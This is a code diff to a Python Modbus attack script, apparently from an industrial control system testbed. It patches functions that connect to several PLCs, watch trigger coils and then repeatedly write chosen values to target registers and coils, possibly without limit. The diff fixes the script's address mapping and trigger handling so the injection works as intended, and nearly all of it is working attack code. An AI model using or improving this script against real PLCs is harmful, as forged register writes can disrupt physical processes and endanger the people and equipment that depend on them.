@@ -20,7 +20,10 @@ def get_reg_addr(register):
         else:
             address = int(register[4]) + (8 * int(register[2]))
     elif register[1] == "W":
-        address = int(register[2:]) + 1024
+        if register[0] == "M":
+            address = int(register[2:]) + 1024
+        else:
+            address = int(register[2:])
     elif register[1] == "D":
         address = int(register[2:]) + 2048
     elif register[1] == "L":
@@ -32,7 +35,7 @@ def perform_register_attack(client, address, value, packets):
     print("Writing " + str(value) + " to register %MX0." + str(address))
     count = 0
     while count < packets or packets == -1:
-        resp = client.write_register(address, value, slave=1)
+        resp = client.write_register(address, value)
         count += 1
         if resp.isError():
             print("ERROR writing register %MX0." + str(address))
@@ -93,7 +96,7 @@ def attack(ctx):
         tr3 = attack_config["plc3"]["triggers"].replace(' ', '').split(',')
         prefs["plc3"]["triggers"] = [x.split('=') for x in tr3] if tr3 != [''] else []
 
-    print("CONFIG: " + str(prefs))
+    # print("CONFIG: " + str(prefs))
 
     #
     # retrieve registers, coils and triggers from PLCs
@@ -120,7 +123,7 @@ def attack(ctx):
 
     print("TARGET REGISTERS: " + str(registers_to_attack))
     print("TARGET COILS: " + str(coils_to_attack))
-    print("TRIGGER COILS: " + str(triggers_register))
+    # print("TRIGGER COILS: " + str(triggers_register))
 
     #
     # listener that occurs when a register value changes
@@ -168,7 +171,7 @@ def attack(ctx):
             # connect to PLC3
             client3 = ModbusTcpClient(hp3[0], int(hp3[1]))
             client3.connect()
-            for tt in prefs["plc2"]["triggers"]:
+            for tt in prefs["plc3"]["triggers"]:
                 print("Checking value of PLC3 coil %QX0." + str(get_reg_addr(tt[0])))
                 response = client3.read_coils(get_reg_addr(tt[0]))
                 coil_val = 1 if response.bits[0] else 0
@@ -181,7 +184,7 @@ def attack(ctx):
             print("Start attack...")
             attack_started = True
             n_pack = int(prefs["packets"]) if prefs["packets"] != 'inf' else -1
-            value = int(prefs["value"]) == 1
+            value = int(prefs["value"]) > 0
 
             # stop listening for the value of the trigger coils.
             for c in triggers_register:
